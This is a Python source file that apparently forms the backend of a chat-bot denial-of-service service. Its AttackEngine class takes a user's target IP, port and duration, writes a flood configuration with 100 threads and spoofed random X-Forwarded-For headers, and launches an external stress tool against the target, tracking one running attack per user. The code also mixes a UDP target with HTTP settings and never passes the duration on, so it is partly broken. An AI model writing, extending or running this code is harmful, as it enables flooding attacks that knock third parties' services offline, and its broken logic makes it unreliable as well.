# attack_engine.py
import subprocess
import json
import tempfile
import os
import threading

class AttackEngine:
    def __init__(self):
        self.active_attacks = {}

    def start_attack(self, user_id, target_ip, target_port, duration, threads=100):
        if user_id in self.active_attacks:
            return False, " Attack already running! Use /stop first."
        if not (5 <= duration <= 300):
            return False, " Time must be 5-300 seconds."

        target_url = f"udp://{target_ip}:{target_port}/"
        config = {
            "url": target_url,
            "method": "GET",
            "timeout": 1,
            "success_status_codes": [200, 201, 202, 204],
            "start_interval": 0.05,
            "start_burst": 1,
            "start_threads": threads,
            "headers": {
                "User-Agent": "Mozilla/5.0",
                "X-Forwarded-For": "%%randomipv4%%"
            }
        }

        with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
            json.dump(config, f, indent=4)
            config_path = f.name

        cmd = ["stressanapi", config_path]
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        self.active_attacks[user_id] = proc

        def monitor():
            proc.wait()
            if user_id in self.active_attacks:
                del self.active_attacks[user_id]
            try:
                os.unlink(config_path)
            except:
                pass

        threading.Thread(target=monitor, daemon=True).start()
        return True, f" FUCK ATTACK started on {target_ip}:{target_port} for {duration}s with {threads} threads"

    def stop_attack(self, user_id):
        if user_id in self.active_attacks:
            self.active_attacks[user_id].terminate()
            del self.active_attacks[user_id]
            return True
        return False

    def is_attack_running(self, user_id):
        return user_id in self.active_attacks